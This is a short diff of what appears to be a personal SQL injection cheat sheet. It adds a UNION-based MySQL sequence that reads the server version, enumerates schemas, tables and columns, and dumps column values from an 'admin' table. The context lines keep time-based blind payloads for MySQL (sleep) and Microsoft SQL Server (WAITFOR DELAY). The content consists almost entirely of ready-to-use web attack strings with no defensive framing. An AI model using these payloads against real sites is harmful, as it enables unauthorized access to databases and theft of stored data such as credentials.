@@ -17,6 +17,13 @@ and if(substr(select schema_name from information_schema.schemata > a, sleep(10)
 %20AND%20IF(((ascii(substr((SELECT%20schema_name%20FROM information_schema.schemata%20LIMIT 0,1),1,1))))%20>%2095,sleep(10),NULL)--%20-
 
 
+For my sql error bse attack
+UNION ALL SELECT NULL,NULL,version()--
+'UNION ALL SELECT NULL,concat(schema_name),NULl FROM information_schema.schemata-- -
+'UNION ALL SELECT NULL,concat(TABLE_NAME),NULL FROM information_schema.TABLES WHERE table_schema='admin'-- -
+' UNION ALL SELECT NULL,concat(column_name),NULL FROM information_schema.COLUMNS WHERE TABLE_NAME='admin'-- -
+'UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29),NULL FROM admin-- 
+
 Microsoft SQL injection blind database dump
 'WAITFOR DELAY '0:0:10'
 
